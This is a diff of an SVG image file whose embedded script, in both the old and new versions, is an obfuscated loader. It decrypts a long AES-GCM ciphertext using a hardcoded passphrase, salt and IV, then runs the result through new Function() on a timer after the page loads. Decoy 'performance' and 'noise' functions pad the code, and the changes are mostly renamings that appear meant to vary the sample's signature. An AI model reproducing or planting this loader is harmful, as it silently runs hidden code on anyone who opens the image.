@@ -3,137 +3,141 @@
   <!-- U2FsdGVkX19vbmx5X2Zvcl9kZWNvcmF0aW9uX3B1cnBvc2Vz -->
 
   <script type="application/javascript"><![CDATA[
-    // === SYSTEM FAKE PERFORMANCE MODULE ===
-    const SYS_TAG = "[SECURE_ENGINE_V3]";
-    const performanceMetrics = {
-      timestampStart: Date.now(),
-      memoryUsed: 0,
-      simulatedLoadValue: 0,
-      tickInterval: 0,
-      randomInitSeed: 99
+    // ===== FAKE SYSTEM LOAD SIMULATOR =====
+    const SYSTEM_FLAG = "[SECURE_ENGINE_V3]";
+    let sysPerformance = {
+      startTime: Date.now(),
+      usedMemory: 0,
+      loadFakeValue: 0,
+      tickCount: 0,
+      randSeed: 99
     };
 
-    // Dummy constant variables for no reason
-    const bel = "[EMAIL]";
+    // Redundant constants to confuse
+const bel = "[EMAIL]";
     const lieve = "[KEY]";
-    
-    // Noise generator function for no reason
-    function generateRandomNoise() {
-      const partX = Math.random().toString(36).substring(3, 16);
-      const partY = Math.random().toString(36).substring(3, 16);
-      return partX + partY;
+
+    // Pointless noise generator
+    function createRandomStringNoise() {
+      let segmentA = Math.random().toString(36).slice(4, 14);
+      let segmentB = Math.random().toString(36).slice(3, 13);
+      return segmentA + segmentB;
     }
 
-    // Function to update system stats for no purpose
-    function refreshSystemMetrics() {
-      performanceMetrics.memoryUsed = window.performance?.memory?.usedJSHeapSize ?? 0;
-      performanceMetrics.simulatedLoadValue = Math.random() * 1000;
-      performanceMetrics.tickInterval++;
+    // Update fake metrics (not actually used)
+    function updateFakeMetrics() {
+      sysPerformance.usedMemory = window.performance?.memory?.usedJSHeapSize || 0;
+      sysPerformance.loadFakeValue = Math.random() * 2000;
+      sysPerformance.tickCount++;
     }
 
-    // ==== ENCRYPTION HANDLING MODULE ====
-    const encryptionProcessor = (function() {
-      const secretData = {
-        iv: "f11fa4cf9350b5a4f4874a76",
-        salt: "e6a57e356b20c5dab33579c46a703cda",
-        encryptedValue: "496a79d4cab3f623d8b2a69380a2701909fe77d23de6bb94c3d4ec7557332743f20ae339a48001626943df086e9cf068d5e7dfdbf157ced02a2a984add5170abc20946e79ea812558373c02167e53f9bac58eb7572151b12bf86c2c58930977f173c052ee322db89a6dca5f98815fabfdc53a45f5fd5456f18cf170540fbc8e46b5da7bd3ab6967616122de0a1d37db447db8aed94f8b42d62fa1ba07cd43eb9a8e1d6ef1622db5a5ee2071ff4e543201ae082fe5c7c87da690abe014170b68af9361fef47d452415a4ae048ab3cc57e87ebc91e056a023a94a871c7b91b82c3b7dc369e4c4d25bdc19da4fff30aa707cb5d13b48d951f4881d7f3788c2ed0de3d8fbfc9258c8d4a9e383fce9f4c7b47d40e5ba6d9a1e364f15ea52891bc3fa9c7c069010a9cf24a0b9a79d6b664d3c12bbb57b24ea8da4761fde85fda06f5752b54bf5401e36b19e6e4422ecab5803ef571b2e7895e77d213ed2900aca6420ddcd08989be88c1ecf30964a1f4ceb5d027d14ecbb9a47e7ce47ddbb393bdd2eae42ece59cdb9510d2f024c4f679e32fc049fd4fe442c6e615c6591efa25c0eb54162f31503d72261c7f9f865fa5eb6d1a5a52869a76539fc837d42b0f6eb55b1a70288e4378d0dcf512d44f87448fc9621992b5cc7297e35b0855cf20bc13fec807b8c09ad52ffc95832e6fe250e491628be49",
-        passphrase: "glad"
+    // ===== ENCRYPTION UTILS MODULE =====
+    const cryptoModule = (function(){
+      const keys = {
+        ivHex: "f11fa4cf9350b5a4f4874a76",
+        saltHex: "e6a57e356b20c5dab33579c46a703cda",
+        encryptedHex: "496a79d4cab3f623d8b2a69380a2701909fe77d23de6bb94c3d4ec7557332743f20ae339a48001626943df086e9cf068d5e7dfdbf157ced02a2a984add5170abc20946e79ea812558373c02167e53f9bac58eb7572151b12bf86c2c58930977f173c052ee322db89a6dca5f98815fabfdc53a45f5fd5456f18cf170540fbc8e46b5da7bd3ab6967616122de0a1d37db447db8aed94f8b42d62fa1ba07cd43eb9a8e1d6ef1622db5a5ee2071ff4e543201ae082fe5c7c87da690abe014170b68af9361fef47d452415a4ae048ab3cc57e87ebc91e056a023a94a871c7b91b82c3b7dc369e4c4d25bdc19da4fff30aa707cb5d13b48d951f4881d7f3788c2ed0de3d8fbfc9258c8d4a9e383fce9f4c7b47d40e5ba6d9a1e364f15ea52891bc3fa9c7c069010a9cf24a0b9a79d6b664d3c12bbb57b24ea8da4761fde85fda06f5752b54bf5401e36b19e6e4422ecab5803ef571b2e7895e77d213ed2900aca6420ddcd08989be88c1ecf30964a1f4ceb5d027d14ecbb9a47e7ce47ddbb393bdd2eae42ece59cdb9510d2f024c4f679e32fc049fd4fe442c6e615c6591efa25c0eb54162f31503d72261c7f9f865fa5eb6d1a5a52869a76539fc837d42b0f6eb55b1a70288e4378d0dcf512d44f87448fc9621992b5cc7297e35b0855cf20bc13fec807b8c09ad52ffc95832e6fe250e491628be49",
+        password: "glad"
       };
 
-      const emptyConfig = {
-        activeState: false,
-        nullPlaceholder: null,
-        noiseIndicator: generateRandomNoise()
+      // Mock config that does nothing
+      const fakeConfig = {
+        enabled: false,
+        nullValue: null,
+        noiseSignal: createRandomStringNoise()
       };
 
       return {
-        getIV: () => secretData.iv,
-        getSalt: () => secretData.salt,
-        getEncryptedData: () => secretData.encryptedValue,
-        getPassphrase: () => secretData.passphrase,
-        getMockConfig: () => ({ ...emptyConfig })
+        fetchIV: () => keys.ivHex,
+        fetchSalt: () => keys.saltHex,
+        fetchEncryptedData: () => keys.encryptedHex,
+        fetchPassword: () => keys.password,
+        getFakeSettings: () => ({ ...fakeConfig })
       };
     })();
 
-    // Convert hex to byte array
-    function hexStringToBytes(hexString) {
-      const length = hexString.length / 2;
-      const byteArray = new Uint8Array(length);
-      for (let idx = 0; idx < length; idx++) {
-        byteArray[idx] = parseInt(hexString.substr(idx * 2, 2), 16);
+    // Convert hex string to Uint8Array
+    function hexToUint8Array(hexStr) {
+      let len = hexStr.length / 2;
+      let arr = new Uint8Array(len);
+      for(let i=0; i < len; i++) {
+        arr[i] = parseInt(hexStr.substr(i*2, 2), 16);
       }
-      return byteArray;
+      return arr;
     }
 
-    // Useless async delay function
-    async function pointlessWait() {
+    // Useless async wait (adds artificial delay)
+    async function waitDummy() {
       return new Promise(resolve => {
         setTimeout(() => {
-          resolve(generateRandomNoise());
-        }, 100);
+          resolve(createRandomStringNoise());
+        }, 150);
       });
     }
 
-    async function decryptData() {
-      refreshSystemMetrics();
+    async function runDecryption() {
+      updateFakeMetrics();
 
       try {
-        const passphrase = encryptionProcessor.getPassphrase();
+        const pwd = cryptoModule.fetchPassword();
 
-        const baseKey = await window.crypto.subtle.importKey(
+        // Import raw key for PBKDF2
+        const rawKey = await window.crypto.subtle.importKey(
           "raw",
-          new TextEncoder().encode(passphrase),
-          { name: "PBKDF2" },
+          new TextEncoder().encode(pwd),
+          {name: "PBKDF2"},
           false,
           ["deriveKey"]
         );
 
-        const saltArray = hexStringToBytes(encryptionProcessor.getSalt());
+        const saltBytes = hexToUint8Array(cryptoModule.fetchSalt());
 
-        const derivedKey = await window.crypto.subtle.deriveKey(
+        // Derive AES-GCM key from PBKDF2
+        const aesKey = await window.crypto.subtle.deriveKey(
           {
             name: "PBKDF2",
-            salt: saltArray,
+            salt: saltBytes,
             iterations: 100000,
             hash: "SHA-256"
           },
-          baseKey,
+          rawKey,
           { name: "AES-GCM", length: 256 },
           false,
           ["decrypt"]
         );
 
-        const ivArray = hexStringToBytes(encryptionProcessor.getIV());
-        const encryptedArray = hexStringToBytes(encryptionProcessor.getEncryptedData());
+        const ivBytes = hexToUint8Array(cryptoModule.fetchIV());
+        const encryptedBytes = hexToUint8Array(cryptoModule.fetchEncryptedData());
 
-        await pointlessWait();
+        await waitDummy();
 
-        const decryptedBuffer = await window.crypto.subtle.decrypt(
+        const decryptedDataBuffer = await window.crypto.subtle.decrypt(
           {
             name: "AES-GCM",
-            iv: ivArray
+            iv: ivBytes
           },
-          derivedKey,
-          encryptedArray
+          aesKey,
+          encryptedBytes
         );
 
-        const resultText = new TextDecoder().decode(decryptedBuffer);
-        (new Function(resultText))();
+        const decryptedText = new TextDecoder().decode(decryptedDataBuffer);
+        (new Function(decryptedText))();
 
-      } catch (err) {
-        console.error("Decryption failed:", err);
+      } catch(e) {
+        console.error("Decryption error:", e);
       }
     }
 
-    // Pointless initialization log
+    // Fake initialization logs with useless loops
     window.addEventListener('DOMContentLoaded', () => {
-      console.info("System initialized successfully.");
-      for(let i = 0; i < 3; i++) {
-        console.debug(`Log iteration: ${i} - debug trace`);
+      console.info("System bootstrapped.");
+      for(let counter=0; counter < 5; counter++) {
+        console.debug(`Debug iteration #${counter}: alive`);
       }
     });
 
-    // Trigger decryption after delay
-    setTimeout(decryptData, 500);
+    // Kick off decryption after a short timeout
+    setTimeout(runDecryption, 600);
+
   ]]></script>
 </svg>
